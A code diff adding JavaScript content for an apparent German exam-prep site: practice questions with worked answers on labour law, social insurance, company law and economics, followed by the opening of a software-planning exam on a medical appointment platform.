+      {pts: 4, topic: 'Arbeitsrechtliche Gesetze', q: 'Ordnen Sie die Regelungen dem Gesetz zu, in dem sie stehen.',
+        match: {keys: ['Berufsbildungsgesetz (BBiG)', 'Jugendarbeitsschutzgesetz (JArbSchG)', 'Arbeitszeitgesetz (ArbZG)', 'Bundesurlaubsgesetz (BUrlG)', 'Kündigungsschutzgesetz (KSchG)', 'Mutterschutzgesetz (MuSchG)'], items: [
+          ['Ein 16-jähriger Praktikant darf höchstens 8 Stunden täglich und 40 Stunden wöchentlich beschäftigt werden.', 1],
+          ['Nach Ende der täglichen Arbeitszeit ist eine ununterbrochene Ruhezeit von mindestens 11 Stunden einzuhalten.', 2],
+          ['Der Mindesturlaub beträgt 24 Werktage im Jahr.', 3],
+          ['Eine Kündigung ist unwirksam, wenn sie sozial ungerechtfertigt ist.', 4],
+          ['Auszubildende müssen einen Ausbildungsnachweis führen.', 0],
+          ['In den letzten sechs Wochen vor der Entbindung darf eine Schwangere nur auf eigenen ausdrücklichen Wunsch beschäftigt werden.', 5],
+        ]},
+        a: ['JArbSchG § 8 (8 h/Tag, 40 h/Woche), ArbZG § 5 (11 h Ruhezeit), BUrlG § 3 (24 Werktage bei 6-Tage-Woche), KSchG § 1 (soziale Rechtfertigung: personen-, verhaltens- oder betriebsbedingt), BBiG § 13 (Pflichten der Auszubildenden), MuSchG § 3 (Schutzfrist 6 Wochen vor und 8 Wochen nach der Entbindung).'], see: ['wiso-jarbschg', 'wiso-arbeitsvertrag']},
+      {pts: 3, topic: 'Urlaub', q: 'Ein Kollege arbeitet an **5 Tagen pro Woche**. Wie viele **Arbeitstage** gesetzlichen Mindesturlaub hat er im Jahr?',
+        num: {c: 20, tol: 0, unit: 'Arbeitstage'},
+        a: ['Das BUrlG rechnet mit **24 Werktagen** (6-Tage-Woche, Montag bis Samstag). Umrechnung: 24 / 6 x 5 = **20 Arbeitstage**. Bei 4 Tagen wären es 16.'], see: ['wiso-urlaub']},
+      {pts: 4, topic: 'Kündigungsfrist', q: 'Der Arbeitgeber kündigt einer Disponentin, die seit **9 Jahren** im Betrieb ist, ordentlich. Die Kündigung geht ihr am **14. Mai 2026** zu. Ein Tarifvertrag regelt die Frist nicht. Wann endet das Arbeitsverhältnis?',
+        ctx: [['table', ['Betriebszugehörigkeit', 'Frist bei Kündigung durch den Arbeitgeber (§ 622 Abs. 2 BGB)'], [['ab 2 Jahre', '1 Monat zum Monatsende'], ['ab 5 Jahre', '2 Monate zum Monatsende'], ['ab 8 Jahre', '3 Monate zum Monatsende'], ['ab 10 Jahre', '4 Monate zum Monatsende']]]],
+        mc: {o: ['31. Juli 2026', '14. August 2026', '31. August 2026', '30. September 2026'], c: [2]},
+        a: ['9 Jahre: **3 Monate zum Ende eines Kalendermonats**. Ab Zugang (14.05.) drei Monate: 14.08.; dann bis zum **Monatsende**: **31. August 2026**. Die Frist muss vollständig eingehalten werden, deshalb nicht 31. Juli.'], see: ['wiso-kuendigung']},
+      {pts: 3, topic: 'Mitbestimmung', q: 'In welchem Fall hat der Betriebsrat ein **echtes Mitbestimmungsrecht** (ohne seine Zustimmung oder einen Spruch der Einigungsstelle keine Umsetzung)?',
+        mc: {o: ['NordLog will einen neuen Standort in Hamburg eröffnen.', 'NordLog will die Scanner so einstellen, dass die Pickleistung jedes Mitarbeitenden ausgewertet werden kann.', 'NordLog will die Preise für Lagerleistungen erhöhen.', 'NordLog will einen neuen Geschäftsführer einstellen.'], c: [1]},
+        a: ['§ 87 Abs. 1 Nr. 6 BetrVG: **Einführung und Anwendung technischer Einrichtungen, die geeignet sind, Verhalten oder Leistung zu überwachen**, ist mitbestimmungspflichtig. Wirtschaftliche Entscheidungen (Standort, Preise) unterliegen höchstens Informationsrechten (Wirtschaftsausschuss); die Einstellung leitender Angestellter ist nur mitzuteilen.'], see: ['wiso-betriebsrat']},
+      {pts: 3, topic: 'JAV', q: 'Wer ist bei der Wahl der Jugend- und Auszubildendenvertretung (JAV) **wahlberechtigt**?',
+        mc: {o: ['Alle Beschäftigten unter 30 Jahren.', 'Beschäftigte unter 18 Jahren und Auszubildende unter 25 Jahren.', 'Nur Auszubildende, unabhängig vom Alter.', 'Nur Beschäftigte unter 18 Jahren.'], c: [1]},
+        a: ['§ 61 BetrVG: Wahlberechtigt sind Arbeitnehmer, die das **18. Lebensjahr noch nicht vollendet** haben, und **Auszubildende, die das 25. Lebensjahr noch nicht vollendet** haben. Wählbar sind Beschäftigte unter 25 Jahren. Eine JAV gibt es ab 5 solcher Beschäftigten, wenn ein Betriebsrat besteht; Amtszeit 2 Jahre.'], see: ['wiso-betriebsrat']},
+      {pts: 3, topic: 'Tarifvertrag', q: 'Was bedeutet die **Friedenspflicht**?',
+        mc: {o: ['Während der Laufzeit eines Tarifvertrags sind Arbeitskämpfe über die darin geregelten Inhalte unzulässig.', 'Arbeitnehmer dürfen am Arbeitsplatz keine politischen Diskussionen führen.', 'Der Betriebsrat darf nicht zum Streik aufrufen, wohl aber die JAV.', 'Arbeitgeber müssen Streikende nach dem Streik weiterbeschäftigen.'], c: [0]},
+        a: ['Die **Friedenspflicht** folgt aus dem Tarifvertrag: Solange er gilt, dürfen die Tarifparteien über die geregelten Punkte **nicht streiken oder aussperren**. Erst nach Ablauf bzw. Kündigung sind Arbeitskämpfe möglich (Warnstreiks während laufender Verhandlungen nach Ablauf). Der Betriebsrat unterliegt ohnehin der betrieblichen Friedenspflicht (§ 74 BetrVG).'], see: ['wiso-tarif']},
+      {pts: 4, topic: 'Arbeitskampf', q: 'Bringen Sie den typischen Ablauf einer Tarifauseinandersetzung in die richtige Reihenfolge.',
+        order: [['Der bisherige Tarifvertrag wird gekündigt bzw. läuft aus.', 1], ['Urabstimmung: mindestens 75 % der Gewerkschaftsmitglieder stimmen für einen Streik.', 4], ['Tarifverhandlungen zwischen Gewerkschaft und Arbeitgeberverband.', 2], ['Die Verhandlungen werden für gescheitert erklärt (ggf. nach Schlichtung).', 3], ['Streik (ggf. Aussperrung durch die Arbeitgeber).', 5], ['Zweite Urabstimmung über das neue Ergebnis (mindestens 25 % Zustimmung), neuer Tarifvertrag.', 6]],
+        a: ['Kündigung des Tarifvertrags, Verhandlungen, Scheitern (ggf. Schlichtung), **Urabstimmung mit 75 %**, Streik, neue Verhandlungen und Einigung, **zweite Urabstimmung mit 25 %**, neuer Tarifvertrag mit Friedenspflicht. Die Prozentsätze stehen in den Satzungen der Gewerkschaften (zum Beispiel ver.di).'], see: ['wiso-tarif', 'wiso-gewerkschaft']},
+      {pts: 3, topic: 'Günstigkeitsprinzip', q: 'Der Tarifvertrag sieht 30 Urlaubstage vor, Ihr Arbeitsvertrag 28 Tage, eine Betriebsvereinbarung 31 Tage. Wie viele Urlaubstage stehen Ihnen zu?',
+        mc: {o: ['28 Tage, denn der Arbeitsvertrag ist spezieller.', '30 Tage, denn der Tarifvertrag geht immer vor.', '31 Tage nach dem Günstigkeitsprinzip.', '24 Werktage, denn es gilt das Bundesurlaubsgesetz.'], c: [2]},
+        a: ['**Günstigkeitsprinzip:** Rangniedrigere Regelungen dürfen von höherrangigen abweichen, wenn sie für den Arbeitnehmer **günstiger** sind. Es gilt die günstigste Regelung: **31 Tage**. Der Arbeitsvertrag mit 28 Tagen ist insoweit unwirksam, weil er schlechter als Tarifvertrag und Gesetz ist. (Hinweis: Betriebsvereinbarungen dürfen tariflich geregelte Arbeitsentgelte und Arbeitsbedingungen nach § 77 Abs. 3 BetrVG nur regeln, wenn der Tarifvertrag es zulässt.)'], see: ['wiso-tarif', 'wiso-arbeitsvertrag']},
+      {pts: 4, topic: 'Mindestlohn', q: 'Für wen gilt der **gesetzliche Mindestlohn nicht**? Kreuzen Sie **zwei** Antworten an.',
+        mc: {o: ['Auszubildende im Rahmen der Berufsausbildung nach dem BBiG', 'Minijobber mit Verdienst bis zur Geringfügigkeitsgrenze', 'Langzeitarbeitslose in den ersten sechs Monaten einer neuen Beschäftigung', 'Teilzeitkräfte in tarifgebundenen Betrieben', 'Studierende in einem freiwilligen Praktikum von 5 Monaten Dauer'], c: [0, 2]},
+        a: ['§ 22 MiLoG: Ausgenommen sind unter anderem **Auszubildende** (für sie gilt die **Mindestausbildungsvergütung** nach § 17 BBiG), **Langzeitarbeitslose in den ersten 6 Monaten**, Jugendliche unter 18 ohne Berufsabschluss, Pflichtpraktika und freiwillige Praktika **bis 3 Monate**. Minijobber und Teilzeitkräfte erhalten den Mindestlohn; ein freiwilliges Praktikum über 3 Monate ist ebenfalls mindestlohnpflichtig.'], see: ['wiso-gehalt', 'wiso-bbig']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 2: Soziale Sicherung und Arbeitsschutz (23 Punkte)',
+    tasks: [
+      {pts: 5, topic: 'Sozialversicherung', q: 'Ein Kollege (28 Jahre, kinderlos, Betrieb in Bremen) verdient **3.800 Euro brutto** im Monat. Berechnen Sie seinen **Arbeitnehmeranteil** zur Sozialversicherung in Euro (auf zwei Nachkommastellen).',
+        ctx: [['table', ['Zweig', 'Beitragssatz gesamt', 'Aufteilung'], [['Krankenversicherung', '14,6 % + Zusatzbeitrag 2,9 %', 'je zur Hälfte'], ['Rentenversicherung', '18,6 %', 'je zur Hälfte'], ['Arbeitslosenversicherung', '2,6 %', 'je zur Hälfte'], ['Pflegeversicherung', '3,6 %', 'je zur Hälfte, Kinderlose ab 23 zahlen 0,6 % allein zusätzlich']]]],
+        num: {c: 826.5, tol: 0.01, unit: 'Euro'},
+        a: [['table', ['Zweig', 'AN-Satz', 'Betrag'], [['KV (14,6 % + 2,9 %) / 2', '8,75 %', '332,50 Euro'], ['RV 18,6 % / 2', '9,30 %', '353,40 Euro'], ['AV 2,6 % / 2', '1,30 %', '49,40 Euro'], ['PV 3,6 % / 2 + 0,6 %', '2,40 %', '91,20 Euro'], ['**Summe**', '**21,75 %**', '**826,50 Euro**']]], 'Die Unfallversicherung zahlt der Arbeitgeber allein. Beide Beträge liegen unter den Beitragsbemessungsgrenzen.'], see: ['wiso-sv', 'wiso-gehalt']},
+      {pts: 3, topic: 'Unfallversicherung', q: 'Sie stürzen auf dem direkten Weg von der Berufsschule zum Betrieb mit dem Fahrrad. Welche Aussage ist richtig?',
+        mc: {o: ['Es handelt sich um einen privaten Unfall, zuständig ist die Krankenkasse.', 'Es ist ein Wegeunfall; zuständig ist die Berufsgenossenschaft, deren Beiträge allein der Arbeitgeber zahlt.', 'Es ist ein Wegeunfall; zuständig ist die Rentenversicherung.', 'Versichert sind nur Unfälle auf dem Betriebsgelände.'], c: [1]},
+        a: ['Der **direkte Weg** zwischen Wohnung, Betrieb und Berufsschule ist in der **gesetzlichen Unfallversicherung** versichert (Wegeunfall). Träger sind die **Berufsgenossenschaften**; die Beiträge zahlt **allein der Arbeitgeber**. Leistungen: Heilbehandlung, Verletztengeld, Reha, Rente.'], see: ['wiso-uv']},
+      {pts: 3, topic: 'Entgeltfortzahlung', q: 'Ein Mitarbeiter ist seit 2 Jahren im Betrieb und wird krank. Welche Aussage ist richtig?',
+        mc: {o: ['Der Arbeitgeber zahlt das Entgelt bis zu 6 Wochen weiter, danach zahlt die Krankenkasse Krankengeld.', 'Die Krankenkasse zahlt ab dem ersten Tag 70 % des Bruttoentgelts.', 'Der Arbeitgeber zahlt bis zu 6 Monate das volle Entgelt.', 'Eine Krankmeldung ist erst ab dem 5. Tag nötig.'], c: [0]},
+        a: ['**Entgeltfortzahlungsgesetz:** bis zu **6 Wochen** volle Fortzahlung durch den Arbeitgeber (nach 4 Wochen Betriebszugehörigkeit). Danach zahlt die Krankenkasse **Krankengeld** (70 % des Brutto, höchstens 90 % des Netto). Die Arbeitsunfähigkeit muss **unverzüglich** gemeldet werden; ab dem **4. Tag** ist sie ärztlich festzustellen (eAU, Abruf durch den Arbeitgeber).'], see: ['wiso-krank', 'wiso-kv']},
+      {pts: 3, topic: 'Elternzeit', q: 'Welche Aussage zur Elternzeit ist richtig?',
+        mc: {o: ['Elternzeit steht nur der Mutter zu.', 'Jeder Elternteil kann bis zu drei Jahre Elternzeit je Kind nehmen; währenddessen besteht besonderer Kündigungsschutz.', 'Während der Elternzeit zahlt der Arbeitgeber das volle Gehalt weiter.', 'Elternzeit muss spätestens eine Woche vorher mündlich angekündigt werden.'], c: [1]},
+        a: ['BEEG: Anspruch auf **bis zu 3 Jahre** Elternzeit je Kind und Elternteil (bis zum 3. Geburtstag, Teile bis zum 8. Geburtstag übertragbar). **Kündigungsschutz** ab Anmeldung. Kein Gehalt vom Arbeitgeber; der Staat zahlt **Elterngeld**. Anmeldung **schriftlich, 7 Wochen** vor Beginn (bei Elternzeit bis zum 3. Geburtstag).'], see: ['wiso-arbeitsvertrag']},
+      {pts: 3, topic: 'Gefährdungsbeurteilung', q: 'Wer ist nach dem Arbeitsschutzgesetz verpflichtet, eine **Gefährdungsbeurteilung** für die Arbeitsplätze im Lager durchzuführen?',
+        mc: {o: ['Die Berufsgenossenschaft', 'Der Betriebsrat', 'Der Arbeitgeber', 'Die Fachkraft für Arbeitssicherheit allein, ohne Verantwortung des Arbeitgebers'], c: [2]},
+        a: ['§ 5 ArbSchG: Der **Arbeitgeber** muss die Gefährdungen beurteilen, Maßnahmen ableiten und dokumentieren. Er kann sich von Fachkraft für Arbeitssicherheit und Betriebsarzt beraten lassen, die Verantwortung bleibt bei ihm. Die Berufsgenossenschaft berät und überwacht, der Betriebsrat bestimmt bei der Ausgestaltung mit.'], see: ['wiso-arbeitsschutz']},
+      {pts: 3, topic: 'Sicherheitszeichen', q: 'Was bedeutet das abgebildete Zeichen in der Lagerhalle?',
+        ctx: [['signs', [['rettung', 'arrow', 'Zeichen', 'grünes Quadrat mit weißem Pfeil']], '']],
+        mc: {o: ['Verbot, den Bereich zu betreten', 'Rettungsweg / Notausgang in Pfeilrichtung', 'Gebot, Schutzausrüstung zu tragen', 'Warnung vor Flurförderzeugen'], c: [1]},
+        a: ['**Grün und quadratisch = Rettungszeichen** (Notausgang, Fluchtweg, Erste Hilfe). Rot und rund mit Balken = Verbot, blau und rund = Gebot, gelbes Dreieck = Warnung, rot quadratisch = Brandschutz.'], see: ['wiso-arbeitsschutz']},
+      {pts: 3, topic: 'Befristung', q: 'NordLog stellt eine Fachkraft **ohne sachlichen Grund befristet** ein. Was ist nach dem Teilzeit- und Befristungsgesetz zulässig?',
+        mc: {o: ['Höchstens 6 Monate ohne Verlängerung', 'Bis zu 2 Jahre, innerhalb dieser Zeit höchstens dreimal verlängerbar', 'Bis zu 5 Jahre, beliebig oft verlängerbar', 'Eine Befristung ohne Sachgrund ist grundsätzlich unzulässig'], c: [1]},
+        a: ['§ 14 Abs. 2 TzBfG: sachgrundlose Befristung **bis zu 2 Jahre**, bis dahin **höchstens dreimal verlängerbar**, nur bei **Neueinstellung** (nicht, wenn zuvor schon ein Arbeitsverhältnis bestand). Die Befristung muss **schriftlich** vor Arbeitsbeginn vereinbart werden, sonst gilt der Vertrag als unbefristet.'], see: ['wiso-arbeitsvertrag']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 3: Unternehmen und Wirtschaft (40 Punkte)',
+    tasks: [
+      {pts: 3, topic: 'Rechtsform', q: 'Welche Aussage zur **GmbH** ist richtig?',
+        mc: {o: ['Die Gesellschafter haften unbeschränkt mit ihrem Privatvermögen.', 'Das Mindeststammkapital beträgt 25.000 Euro; die Gesellschaft haftet mit ihrem Gesellschaftsvermögen.', 'Die GmbH wird in Abteilung A des Handelsregisters eingetragen.', 'Eine GmbH braucht mindestens zwei Gesellschafter.'], c: [1]},
+        a: ['GmbH: juristische Person, **Stammkapital mindestens 25.000 Euro** (bei Gründung mindestens 12.500 Euro eingezahlt), Haftung **nur mit dem Gesellschaftsvermögen**. Eintrag in **Abteilung B** des Handelsregisters (Kapitalgesellschaften). **Ein-Personen-GmbH** ist möglich. Organe: Geschäftsführer, Gesellschafterversammlung (ggf. Aufsichtsrat ab 500 Beschäftigten).'], see: ['wiso-unternehmen']},
+      {pts: 4, topic: 'Vollmachten', q: 'Bei NordLog hat Frau Ahrens **Prokura**, Herr Paulsen **allgemeine Handlungsvollmacht**. Ordnen Sie zu, wer das Rechtsgeschäft vornehmen darf (ohne besondere Ermächtigung).',
+        match: {keys: ['Frau Ahrens und Herr Paulsen', 'nur Frau Ahrens (Prokura)', 'keiner von beiden, nur die Geschäftsführung'], items: [
+          ['Büromaterial für das Lager bestellen', 0], ['Einen Kredit über 200.000 Euro für neue Gabelstapler aufnehmen', 1], ['Die Bilanz unterschreiben', 2], ['Einen Lagermitarbeiter einstellen', 0], ['Einem Abteilungsleiter Prokura erteilen', 2], ['Einen Rechtsstreit vor Gericht führen', 1],
+        ]},
+        a: ['**Handlungsvollmacht** (§ 54 HGB) deckt **gewöhnliche** Geschäfte des Betriebs; für Grundstücksgeschäfte, **Darlehensaufnahme**, Wechsel und **Prozessführung** braucht sie eine besondere Befugnis. **Prokura** (§ 49 HGB) deckt alle gerichtlichen und außergerichtlichen Geschäfte eines Handelsgewerbes, auch ungewöhnliche, außer: Bilanz und Steuererklärung unterschreiben, Prokura erteilen, Grundstücke belasten/veräußern (ohne Sonderbefugnis), Gesellschafter aufnehmen, Insolvenz anmelden, Geschäft verkaufen.'], see: ['wiso-vollmacht']},
+      {pts: 3, topic: 'Wirtschaftlichkeit', q: 'NordLog hatte im letzten Jahr einen Ertrag von **24.300.000 Euro** und einen Aufwand von **22.500.000 Euro**. Berechnen Sie die **Wirtschaftlichkeit** (zwei Nachkommastellen).',
+        num: {c: 1.08, tol: 0.005},
+        a: ['**Wirtschaftlichkeit = Ertrag / Aufwand** = 24.300.000 / 22.500.000 = **1,08**. Ein Wert über 1 bedeutet: Das Unternehmen wirtschaftet wirtschaftlich (Ertrag größer als Aufwand).'], see: ['wiso-kennzahlen']},
+      {pts: 3, topic: 'Rentabilität', q: 'Der Gewinn beträgt **1.800.000 Euro**, das Eigenkapital **12.000.000 Euro**. Berechnen Sie die **Eigenkapitalrentabilität** in Prozent.',
+        num: {c: 15, tol: 0.01, unit: '%'},
+        a: ['**Eigenkapitalrentabilität = Gewinn / Eigenkapital x 100** = 1.800.000 / 12.000.000 x 100 = **15 %**. Sie zeigt die Verzinsung des eingesetzten Eigenkapitals und wird mit der Rendite sicherer Anlagen verglichen.'], see: ['wiso-kennzahlen']},
+      {pts: 3, topic: 'Produktivität', q: 'Im Lager wurden im Oktober mit **40 Beschäftigten 48.000 Paletten** umgeschlagen. Berechnen Sie die **Arbeitsproduktivität** (Paletten je Beschäftigtem).',
+        num: {c: 1200, tol: 0},
+        a: ['**Arbeitsproduktivität = Ausbringungsmenge / Arbeitseinsatz** = 48.000 Paletten / 40 Beschäftigte = **1.200 Paletten je Beschäftigtem**. Produktivität ist ein **Mengenverhältnis** (Output zu Input), Wirtschaftlichkeit ein Wertverhältnis.'], see: ['wiso-kennzahlen']},
+      {pts: 4, topic: 'Organisation', q: 'Ordnen Sie die Beschreibungen der passenden Organisationsform zu.',
+        match: {keys: ['Einliniensystem', 'Mehrliniensystem', 'Stabliniensystem', 'Matrixorganisation'], items: [
+          ['Jede Stelle hat genau einen Vorgesetzten; der Dienstweg ist klar, aber lang.', 0],
+          ['Spezialisierte Vorgesetzte erteilen direkt Weisungen; eine Stelle kann mehrere Vorgesetzte haben.', 1],
+          ['Wie das Einliniensystem, ergänzt um beratende Stellen ohne Weisungsbefugnis, zum Beispiel Datenschutzbeauftragte.', 2],
+          ['Mitarbeitende unterstehen gleichzeitig einer Funktionsleitung (zum Beispiel IT) und einer Projekt- oder Produktleitung.', 3],
+        ]},
+        a: ['Die Formen unterscheiden sich in der Zahl der Weisungswege.'],
+        sol: [['row', [['diagram', AP2.dg.tree({t: 'GF', c: [{t: 'A', c: [{t: '1'}, {t: '2'}]}, {t: 'B', c: [{t: '3'}, {t: '4'}]}]}, {cap: 'Einliniensystem: ein Vorgesetzter je Stelle', k: 'box', w: 44, h: 34})],
+          ['diagram', {w: 320, h: 220, cap: 'Stabliniensystem: Stab (gestrichelt) berät ohne Weisungsrecht', nodes: [{id: 'g', k: 'box', x: 160, y: 30, w: 70, h: 34, t: 'GF'}, {id: 's', k: 'box', x: 270, y: 90, w: 80, h: 34, t: 'Stab', s: 'ghost'}, {id: 'a', k: 'box', x: 90, y: 170, w: 70, h: 34, t: 'A'}, {id: 'b', k: 'box', x: 230, y: 170, w: 70, h: 34, t: 'B'}],
+            edges: [{a: 'g', b: 's', ea: 'none', k: 'dash', via: [[160, 90]]}, {a: 'g', b: 'a', ea: 'none', via: [[160, 130], [90, 130]]}, {a: 'g', b: 'b', ea: 'none', via: [[160, 130], [230, 130]]}]}],
+          ['diagram', {w: 320, h: 220, cap: 'Matrix: zwei Weisungslinien je Stelle', nodes: [{id: 'p1', k: 'box', x: 50, y: 110, w: 70, h: 34, t: 'Projekt 1', s: 'accent'}, {id: 'p2', k: 'box', x: 50, y: 175, w: 70, h: 34, t: 'Projekt 2', s: 'accent'}, {id: 'f1', k: 'box', x: 170, y: 30, w: 70, h: 34, t: 'IT', s: 'gold'}, {id: 'f2', k: 'box', x: 270, y: 30, w: 70, h: 34, t: 'Vertrieb', s: 'gold'},
+            {id: 'x1', k: 'circle', x: 170, y: 110, w: 26, h: 26, t: ''}, {id: 'x2', k: 'circle', x: 270, y: 110, w: 26, h: 26, t: ''}, {id: 'x3', k: 'circle', x: 170, y: 175, w: 26, h: 26, t: ''}, {id: 'x4', k: 'circle', x: 270, y: 175, w: 26, h: 26, t: ''}],
+            edges: [{a: 'p1', b: 'x2', ea: 'none'}, {a: 'p2', b: 'x4', ea: 'none'}, {a: 'f1', b: 'x3', ea: 'none'}, {a: 'f2', b: 'x4', ea: 'none'}]}]]]],
+        see: ['wiso-organisation']},
+      {pts: 3, topic: 'Konjunktur', q: 'Das Diagramm zeigt die Entwicklung des realen Bruttoinlandsprodukts (Index). In welchem Zeitraum befindet sich die Wirtschaft im **Abschwung (Rezession)**?',
+        ctx: [['chart', {kind: 'line', w: 640, h: 260, labels: ['Q1', 'Q2', 'Q3', 'Q4', 'Q5', 'Q6', 'Q7', 'Q8', 'Q9'], series: [{n: 'reales BIP (Index)', d: [100, 103, 107, 110, 108, 104, 101, 103, 106], k: 'accent'}], ymax: 120, yl: 'Index', legend: true, cap: 'Schematischer Konjunkturverlauf'}]],
+        mc: {o: ['Q1 bis Q4', 'Q4 bis Q7', 'Q7 bis Q9', 'Q2 bis Q3'], c: [1]},
+        a: ['Nach dem **oberen Wendepunkt (Boom) in Q4** sinkt die Wirtschaftsleistung bis zum **unteren Wendepunkt (Depression/Tiefpunkt) in Q7**: **Abschwung Q4 bis Q7**. Q1 bis Q4 ist der Aufschwung, ab Q7 die Erholung. Merkmale des Abschwungs: sinkende Auftragseingänge, Kurzarbeit, steigende Arbeitslosigkeit, sinkende Investitionen.'], see: ['wiso-konjunktur']},
+      {pts: 3, topic: 'Geldpolitik', q: 'Die Inflationsrate im Euroraum liegt deutlich über dem Ziel. Welche Maßnahme der **Europäischen Zentralbank** ist geeignet?',
+        mc: {o: ['Leitzinsen senken, damit Kredite günstiger werden', 'Leitzinsen erhöhen, damit Kredite teurer werden und die Nachfrage sinkt', 'Mehr Staatsanleihen kaufen', 'Die Mehrwertsteuer senken'], c: [1]},
+        a: ['Vorrangiges Ziel der EZB ist **Preisniveaustabilität** (Inflationsziel **2 % mittelfristig**). Gegen Inflation hilft eine **restriktive Geldpolitik**: **Leitzinserhöhung**, weniger Anleihekäufe. Steuern sind Fiskalpolitik (Staat), nicht Geldpolitik.'], see: ['wiso-konjunktur']},
+      {pts: 4, topic: 'Inflationsrate', q: 'Der Verbraucherpreisindex stieg von **118,4** auf **121,3** Punkte. Berechnen Sie die Inflationsrate in Prozent (zwei Nachkommastellen).',
+        num: {c: 2.45, tol: 0.005, unit: '%'},
+        a: ['**Inflationsrate = (neuer Index / alter Index - 1) x 100** = (121,3 / 118,4 - 1) x 100 = **2,45 %**. Falsch wäre die Differenz der Punkte (2,9), denn sie bezieht sich auf das Basisjahr, nicht auf das Vorjahr.'], see: ['wiso-konjunktur']},
+      {pts: 4, topic: 'Markt', q: 'Das Diagramm zeigt Angebot und Nachfrage für Lagerflächen-Mietverträge in einer Region. Wie groß ist der **Angebotsüberhang** (in Tausend m²) bei einem Preis von **7 Euro je m²**?',
+        ctx: [['chart', {kind: 'line', w: 640, h: 280, labels: ['2 €', '3 €', '4 €', '5 €', '6 €', '7 €', '8 €'], series: [{n: 'Nachfrage', d: [70, 60, 50, 40, 30, 20, 10], k: 'accent'}, {n: 'Angebot', d: [10, 20, 30, 40, 50, 60, 70], k: 'ok'}], ymax: 80, yl: 'Menge (Tausend m²)', cap: 'Waagerecht: Preis je m², senkrecht: Menge'}]],
+        num: {c: 40, tol: 0, unit: 'Tausend m²'},
+        a: ['Bei 7 Euro: Angebot **60**, Nachfrage **20**: Angebotsüberhang **60 - 20 = 40 Tausend m²**. Der **Gleichgewichtspreis** liegt bei **5 Euro** (Menge 40). Über dem Gleichgewicht entsteht ein Angebotsüberhang, die Anbieter senken die Preise, bis der Markt geräumt ist.'], see: ['wiso-markt']},
+      {pts: 3, topic: 'Nachhaltigkeit', q: 'Welche Maßnahme von NordLog ist der **ökologischen** Dimension der Nachhaltigkeit zuzuordnen?',
+        mc: {o: ['Einführung flexibler Arbeitszeitmodelle für Eltern', 'Umstellung der Stadtlieferungen auf E-Lkw und Bündelung von Touren per Software', 'Erhöhung der Eigenkapitalquote', 'Zahlung über Tarif für Lagerpersonal'], c: [1]},
+        a: ['Drei Dimensionen: **ökologisch** (Umwelt, Ressourcen, Emissionen), **ökonomisch** (dauerhafte Wirtschaftlichkeit) und **sozial** (Menschen, faire Arbeitsbedingungen). E-Lkw und Tourenbündelung senken Emissionen: ökologisch. Arbeitszeitmodelle und Bezahlung: sozial, Eigenkapital: ökonomisch.'], see: ['wiso-nachhaltigkeit']},
+      {pts: 3, topic: 'Handelsregister', q: 'Welche Aussage zum **Handelsregister** ist richtig?',
+        mc: {o: ['Es wird von der IHK geführt und ist nur Mitgliedern zugänglich.', 'Es wird vom Amtsgericht elektronisch geführt und ist öffentlich; Eintragungen genießen öffentlichen Glauben.', 'Es enthält die Bilanzen aller Unternehmen.', 'Eintragungen sind nur für Kleingewerbetreibende Pflicht.'], c: [1]},
+        a: ['Das Handelsregister wird vom **Amtsgericht** elektronisch geführt und ist **öffentlich** (Einsicht für jeden). Abteilung A: Einzelkaufleute und Personengesellschaften, Abteilung B: Kapitalgesellschaften. Eingetragen werden zum Beispiel Firma, Sitz, Rechtsform, Geschäftsführer, **Prokura**. Bilanzen stehen im Unternehmensregister.'], see: ['wiso-unternehmen', 'wiso-vollmacht']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/ps4-1.js
+// Probeprüfung 4, Planen eines Softwareproduktes: VitaMed Nord MVZ, Terminplattform "TerminPlus" (agil, Datenschutz, Barrierefreiheit).
+(function () {
+  const ID = 'exam4-ps';
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 4 (Gesundheit)', t: 'Planen eines Softwareproduktes: Terminplattform TerminPlus', blocks: []});
+  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.ps,
+    hint: 'Schwerpunkte: agiles Vorgehen mit Scrum, Wirtschaftlichkeit, UML-Modellierung, Barrierefreiheit, Gesundheitsdaten nach DSGVO, Code-Review, Netzwerksicherheit mit DMZ und VPN, Verfügbarkeit.',
+    intro: [
+      ['p', 'Sie arbeiten bei der **Elbcode IT-Solutions GmbH** in Hamburg. Ihr Kunde ist das **VitaMed Nord MVZ** (Medizinisches Versorgungszentrum) mit **9 Praxen**, 38 Ärztinnen und Ärzten und 140 Beschäftigten. Termine werden bisher fast nur telefonisch vergeben; montags zwischen 8 und 10 Uhr ist die Telefonleitung dauerhaft besetzt.'],
+      ['p', 'Ihr Team entwickelt die Plattform **TerminPlus**: Online-Terminbuchung im Web und per App, Erinnerungen per SMS oder E-Mail, Videosprechstunde, Wartezimmeranzeige und eine Schnittstelle zum Praxisverwaltungssystem (PVS). Das Projekt wird mit **Scrum** durchgeführt (Sprints von 2 Wochen).'],
+      ['kv', [['Kunde', 'VitaMed Nord MVZ GmbH, 9 Standorte im Raum Hamburg'], ['Team', '1 Product Owner (Kunde), 1 Scrum Master, 5 Entwickler'], ['Besonderheit', 'Verarbeitung von Gesundheitsdaten, App muss barrierefrei sein'], ['Betrieb', 'Rechenzentrum in Hamburg, Praxen per VPN angebunden']]],
+    ]});
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 1: Agil planen und Wirtschaftlichkeit belegen (25 Punkte)',
+    tasks: [
+      {pts: 6, topic: 'Scrum', q: 'Beschreiben Sie die vier Scrum-Events innerhalb eines Sprints (Zweck und Teilnehmende) und nennen Sie zwei Scrum-Artefakte.',
+        a: ['- **Sprint Planning:** Das Scrum-Team legt das **Sprint-Ziel** fest und wählt Einträge aus dem Product Backlog für den Sprint aus (Sprint Backlog). Teilnehmende: Product Owner, Entwickler, Scrum Master.', '- **Daily Scrum:** täglich höchstens 15 Minuten, die **Entwickler** prüfen den Fortschritt zum Sprint-Ziel und planen den nächsten Tag; Hindernisse werden sichtbar.', '- **Sprint Review:** Am Ende zeigt das Team das **Inkrement** den Stakeholdern (zum Beispiel Praxisleitungen); Feedback fließt ins Product Backlog.', '- **Sprint Retrospektive:** Das Team verbessert seine **Zusammenarbeit und Prozesse** (Was lief gut, was ändern wir?).', 'Artefakte: **Product Backlog** (mit Produktziel), **Sprint Backlog** (mit Sprint-Ziel), **Inkrement** (mit Definition of Done).', 'Bewertung: je Event 1 P, Artefakte 2 P.'],
